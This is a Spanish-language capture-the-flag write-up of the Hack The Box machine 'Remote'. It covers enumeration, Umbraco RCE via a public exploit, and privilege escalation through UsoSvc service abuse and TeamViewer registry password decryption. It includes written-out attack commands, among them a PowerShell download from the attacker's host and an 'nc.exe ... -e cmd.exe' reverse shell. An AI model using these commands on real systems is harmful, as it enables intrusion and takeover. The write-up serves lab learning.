HTB-Remote
===========================

![remoteHTB](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/remoteHTB.png)

## TL;RD

> Explico a veces a muy bajo nivel ya que me enfoco en la gente que esta super perdida en este mundo, además muestro errores que cometi o me extiendo por que si :P por si vez mucho texto ya sabes la razón

## Enumeración 

Como es habitual, reviso que servicios esta corriendo la maquina, en este caso el escaneo va lento, asi que le agrego algunos para acelerar el proceso.

```sh
$ nmap -p- --open -v -n --min-rate=5000 10.10.10.180 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los puertos                                                 |
| --open     | Solo los puertos que están abiertos                                       |
| -v         | Permite ver en consola lo que va encontrando                              |
| -n         | Evita que realice Host Discovery, como resolución DNS                     |
| --min-rate | Indica que no queremos hacer peticiones menores al num que pongamos       |
| -oG        | Guarda el output en un archivo tipo xml (formato grepeable)               |

![nmapInitScan](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/initScan.png)

Con la función que maneja [s4vitar](https://s4vitar.github.io/) puedo extraer los puertos del archivo **initScan**. 

![extractPorts](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/extractPorts.png)

La ejecución es sencilla, solo se debe agregar la función al `$ ~/.bashrc` y correr el comando

```sh
$ extractPorts initScan
```

![extractPortsRun](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/extractPortsRun.png)

Bien, ahora solo queda pegar lo que tenemos en la clipboard y usarlo en el escaneo que haré

```sh
$ nmap -p21,80,111,135,139,445,49665 -sC -sV 10.10.10.180 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -p        | Escaneo de los puertos obtenidos                       |
| -oN       | Guarda el output en un archivo                         |

![portScan1](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/portScan1.png)

![portScan2](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/portScan2.png)

Algunos puertos interesantes eh, FTP, HTTP, RPC (Remote Procedure Call), NetBIOS, Samba y un puerto alto que ni idea... 

#### Empecemos con el puerto 21 FTP.

Al ingresar solo muestra esto. Puedo suponer que hay algun servicio conectado al puerto FTP, pero que ahora no vemos.

![ftpinit](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/ftpinit.png)

#### Sigamos con el servidor web del puerto 80

![pagehome](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/pagehome.png) 

Revisando la pagina web solo encontramos una redireccion en `http://10.10.10.180/contact/` que lleva a un login.

![pageumbracologin](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/pageumbracologin.png) 

Nada mas, no hay credenciales por defecto, no hay injeccion sql o XSS. Sigamos

#### Busquemos con el puerto 111 RPC

Internet tiene un monton de info sobre como explotar el servicio que corre en el puerto 111, entre ellos encontre un post donde explican que si en nuestro escaneo vemos **nfs** (Network File System), significa que tenemos la posibilidad de hacer una montura con la informacion que se esta compartiendo, basicamente:

> Info sobre **showmount** y **mount**: https://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc

> **NFS**: Posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales.

Para verificar que informacion o archivos estan disponibles para ver.

`$ showmount -e 10.10.10.180` 

![mountnfs](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/mountnfs.png) 

Para hacer la montura en nuestro sistema.

`$ mount -t nfs 10.10.10.180:/site_backups ~/remote/content/rpc_info_nfs -o nolock` 

![mountnfsdone](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/mountnfsdone.png) 

Enumerando no encontre nada, no supe buscar, asi que me fui para la web, si buscamos si existe algun archivo que guarde credenciales en el CMS umbraco encontramos que si, **Umbraco.sdf**.

![Umbracosdfcreds](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/umbracosdfcreds.png) 

Encontramos hashes y dos posibles usuarios, vamos a **crackstation**, john, hashcat, etc... A ver si las herramientas nos pueden crackear algo.

![johncrackumbraco](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/johncrackumbraco.png) 

## Explotación

Listo, me fui para el **login** e intente hasta el desespero jajaj, pero no me servia, no entendia por que. Simplemente no estaba tomando todo el dominio del usuario `admin`, es la primera vez que me encuentro con estos poblemas y me gusta encontrarlo. Algunos proveedores o CMS usan el dominio junto al usuario como metodo para registro, por lo tanto al intentar ingresar con el usuario `admin` y la password no funciona. Como se ve en la imagen donde estan los hash, el usuario esta junto a un dominio.

> `admin@htb.local`

Y al intentar con este usuario si me permitio ingresar al dashboard

![pageumbracodash](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/pageumbracodash.png)

Encontramos otro usuario (confirmamos el nickname **ssmith** en la imagen de los hash)

![pageumbracousers](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/pageumbracousers.png)

'Listos, en este punto sabemos que estamos dentro de un CMS llamado Umbraco, lo siguente seria buscar la version y exploits con **searchsploit** o la web.

> Este es el exploit: https://www.exploit-db.com/exploits/46153

El exploit encontrado -explota- dentro de la plataforma un archivo llamado `/umbraco/developer/Xslt/xsltVisualize.aspx` que tiene la posibilidad de darnos un RCE con el parametro **ctl00$body$xsltSelection**. Como POC el exploit ejecuta una calculadora, pero pa que queremos una calculadora jajaj, vamos a por una reverse shell. Revisando el codigo y algunas referencias en internet, lo que le indica el programa que se va a ejecutar en la cmd (claramente) es `proc.StartInfo.FileName = "calc.exe"`, pero esta funcion necesita (si queremos ejecutar otra herramienta diferente a la calculadora :P) llevar algo en `proc.StartInfo.Arguments = "whatever"`. 

![beautycsharp](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/beautycsharp.png) 

> Acá se explica cómo `StartInfo.Arguments and StartInfo.FileName` trabaja: https://stackoverflow.com/questions/7160187/standardoutput-readtoend-hangs

Como ejemplo realice un `ping` hacia la misma maquina a ver si me respondia.

![exploitumbroping](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/exploitumbroping.png) 

Pero intentando **cmd.exe** y algunas variantes para probar `whoami` no podia tener output. Leyendo en internet las propiedades de `StartInfo` y algunos errores de stackoverflow encontré un error en el que me daba una pista clave :P

![stackoverflow](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/stackoverflow.png) 

![exploitdir](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/exploitdir.png) 

Algunas referencias

> https://www.dotnetperls.com/process
> https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.arguments?view=netcore-3.1
> https://stackoverflow.com/questions/15061854/how-to-pass-multiple-arguments-in-processstartinfo#answer-15062027

Perfecto puedo ejecutar comandos dentro de la maquina, lo siguiente seria lograr una reverseshell o alguna herramienta/archivo que se vea interesante. Desde el exploit puedo ver la flag del `user.txt`, peeero la papita esta en conseguir una reverse shell.

Despues de algunos intentos con `certutil.exe` no logre ejecutarlo correctamente, buscando recorde que invocando una petición con **PowerShell** era posible descargar algun archivo de un servidor que previamente se tenga arriba. 

Por lo tanto la idea es mover el binario **nc.exe** a una ruta de trabajo, en esa misma ruta montar un servidor web con python: `python -m SimpleHTTPServer` y lo siguiente seria dentro del payload indicarle esto para que descargue a Windows el archivo.

![exuploadnc](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/exuploadnc.png) 

Y ya tendria en el sistema el binario netcat.

![exdirnc](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/exdirnc.png) 

Ahora queda ejecutar una peticion con **nc.exe** hacia mi maquina pidiendole que llame una consola al generar la conexion :)

![exncdone](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/exncdone.png) 

Listos, adeeeeentro. A por la escalacion de privilegios.

## Escalada de privilegios

Revisando permisos con `> whoami /priv` me muestra esto

![iiswhoamipriv](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/isswhoamipriv.png) 

Revisando por internet al tener el privilegio `SeImpersonatePrivilege - Impersonate a client after authentication` habilitado existe un programa (**JuicyPotato.exe**) que se apoya en el privilegio que tenemos para ejecutar la tarea especificada como Administrador. Estuve un tiempo intentando pero no logre que funcionara, en internet hacian referencia (y en un video de [ippsec](https://www.youtube.com/watch?v=1ae64CdwLHE&t=2320) que si el sistema operativo tenia que ver con Server 2019 no iba a funcionar. Asi que entendí el por que de que no me sirviera ): (o quizas fue error capa 8)

Info del sistema:

![iissysteminfo](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/isssysteminfo.png) 

Enumerando y revisando, encontramos con el comando `> netstat -a` las conexiones de red actuales

> Info netstat: https://geekflare.com/netstat-command-usage-on-windows/

![iisnetstata](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/issnetstata.png)

Acá quede desconcertado, ya que el escaneo inicial no nos habia mostrado tantos puertos abiertos. Procedi a validar y en efecto, no se si el parametro `--min-rate` hizo que no se alcanzaran a ver esos puertos pero bueno el nuevo escaneo mostro esto.

![initscanv2](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/initscanv2.png)

Acá ya veo algo interesante, dos puertos con posibilidad de acceso remoto mediante la herramienta [evil-winrm](https://github.com/Hackplayers/evil-winrm) explotando el servicio WinRM para obtener una shell. Por un lado el **puerto 47001** con WinRM (Windows Remote Management) y el **puerto 5985** con WsMan (WS-Management)

![portscanv21](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/portscanv21.png) 

![portscanv22](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/portscanv22.png) 

Siguiendo con la escalación de privilegios... Estuve mis buenas horas buscando y enumerando, la enumeración en Windows me cuesta un poco más, lo raro que encontre fue que **TeamViewer** en su **version 7** esta instalado, lo cual en ninguna maquina viene por defecto y ya es algo para fijarse (además que la maquina se llama REMOTE y... **que hace TeamViewer?¿?¿**), de resto nada, buscando exploits en internet, archivos donde se guarden credenciales; parecé que no supe buscar por que no encontre nada :(

Revisé el foro oficial en HTB de la maquina a ver si la gente me hacia el favor de arreglar los cables para que volviera la luz (el humor). 

Pues leyendo vi que hay dos maneras para explotar, una que relacionaban con TV (perfecto para no spoilear, ademas ya sabemos que significa) y otra (que llamaban U....c) que entendi solo cuando a alguien se le solto y no lo marcaron como spoiler. **Vamos a resolverla por los dos metodos :)**

### Método UsoSvc

Pues si, buscando informacion me encontre con que **UsoSvc** basicamente funciona como administrador de actualizaciones en windows

> Este servicio es responsable de descargar, instalar y buscar actualizaciones en su computadora. [Acá la referencia](http://windowsbulletin.com/es/what-is-update-orchestrator-service/)

¿Pero de que me sirve saber esto? Bueno, hay un conjunto de herramientas (Github [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)), entre ellas una que podemos usar para validar que rutas de [escalar privilegios](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) tenemos (una ruta seria UsoSvc). Se me habia olvidado usarla antes, es **PowerUp.ps1**, usaremos una funcion que trae llamada **Invoke-AllChecks**

> Info del mismo archivo sobre AllChecks: Runs all functions that check for various Windows privilege escalation opportunities.

Guiandome con un video de [s4vitar](https://www.youtube.com/watch?v=qEhXMZ1GYpE&t=3057) en el que explota en una maquina el mismo servicio **UsoSvc** realizaremos esto:

##### 1. Pues descargarnos PowerUp.ps1 :P
##### 2. Pasarlo a windows

- Linux:

Levantamos un servidor web donde tengamos el archivo.

```sh
$ python -m SimpleHTTPServer
```

- Windows:

Podriamos correr el exploit para pasarnos el **PowerUp.ps1** pero viendo el video aprendi que no era necesario, podemos hacerlo desde cmd simplemente moviendonos a la carpeta donde queremos el archivo y abriendo una sesión powershell

```sh
> powershell
PS > Invoke-WebRequest http://10.10.15.69:<puerto_que_levanta_python>/PowerUp.ps1 -o PowerUp.ps1 # -o de output, le ponemos el nombre de como queremos que quede el archivo
PS > Invoke-Module ./PowerUp.ps1
PS > Invoke-AllChecks | Out-File -Encoding ASCII checks.txt # Guardamos la ejecución del modulo en un archivo llamado checks.txt
```

Listo, validando el contenido de `checks.txt` tenemos:

Nuestro servicio **UsoSvc**

![pscheckstxt1](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/psckeckstxt1.png) 

![pscheckstxt2](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/psckeckstxt2.png) 

Revisando este archivo no hay algo que resalte.

Pues ya solo nos queda ejecutar la instruccion que el propio **checks** nos brinda: `Invoke-ServiceAbuse -ServiceName 'UsoSvc'` pasandole el comando que queremos ejecutar. 

```sh
PS > Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "c:\Windows\TEMP\\nc.exe 10.10.15.69 443 -e cmd.exe"
```

![psusosvcexp](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/psusosvcexp.png) 

Perfecto, tenemos una reverse shell como usuario administrador

Las flags serían estas:

![psechoflags](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/psechoflags.png) 

Lo que vi con este metodo es que la conexion se pierde a los pocos segundos (ya te imaginas como consegui las flags :s) Ni siquiera sabria como buscar en internet si es un problema, un comando que necesito de más o incluso que la propia maquina es la que pueda estar terminando la peticion.

### Metodo TV (TeamViewer)

Bueno como comente arriba, en la enumeración se ve el directorio y sus componentes dentro de `Program Files (x86)`

![enumtv](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/enumtv.png) 
...

Pero no veo nada en ninguno de ellos, en internet se habla que **TeamViewer** guarda en memoria y en un **registro** fragmentos de un ID y contraseña de un usuario, pero no encuentro en que registro.

Peeero, me di en la tarea de volver a realizar la busqueda en internet, pero en este caso leyendo bien y prestando atención, tanta atención que en el primer link encontre mi salvación :) En un hilo de la misma comunidad de TeamViewer encontre esto:

![pagepathtohkeytv](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/pagepathtohkeytv.png) 

Opa, veamos en windows que nos encuentra.

![regqueryhkeytv](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/regqueryhkeytv.png) 

Bien, hay un registro de TeamViewer Version 7, haciendo la misma instruccion pero con `Version7`

![regqueryhkeytv7](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/regqueryhkeytv7.png) 

Vemos el ID del que se habla, un usuario **admin** y una contraseña en cifrado AES (de la cual tambien se habla por internet). 

Pues hay un blog que explica como se ejecuta la vulnerabilidad y además nos brinda un **exploit** en el que solo debemos modificar la cadena AES. Pero hablando muy sencillo, es que TeamViewer usa por defecto una **key** y un **iv**, por lo tanto si esos dos parametros son reusables podemos 1. Desencriptar la cadena que contiene la pw y 2. Escalar privilegios

> Acá la gran explicación y el exploit: https://whynotsecurity.com/blog/teamviewer/

Modificando la cadena y ejecutando el exploit quedaria asi:

![pytvAES](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/pytvAES.png) 

Perfecto, tenemos la password, que entiendo sea del usuario **admin**, solo nos quedaria conectarnos a la maquina con esas credenciales

Ejecutando TeamViewer nos va a pedir un ID de usuario, lo que nos permitiria conectarnos al pc remoto, pero enumerando no encontre nada. Recordemos que antes en nuestro escaneo habiamos visto dos posibles entradas abusando del servicio *WinRM*, bueno vamos a probar. En este caso el usuario **admin** del registro encontrado debe ser de TV, pero como sabemos, en windows el usuario administrador se llama **Administrator**

Pues si hacemos uso de la herramienta con las credenciales que tenemos logramos obtener la shell.

El puerto con conexion remota es el **5985** y eso seria todo, aca vemos los directorios de las flags, que de igual forma habiamos encontrado con la explotación de *UsoSvc*.

![wraccess](https://github.com/jntxJ/Writeups/blob/master/HTB/Remote/images/wraccess.png) 

---

Qué bonita maquina, disfrute mucho la explotación para llegar al user, casi lloro con encontrar el register key, pero me encanto. No habia explotado el servicio **UsoSvc** antes, pero esa explotacion fue sencilla, me sirvio para acordarme de **PowerUp.ps1** y todas sus funcionalidades. De resto muchas gracias por leer este chorrazo de texto. Pero pues me gusta mostrar los fails y los success :) A romper todo <3
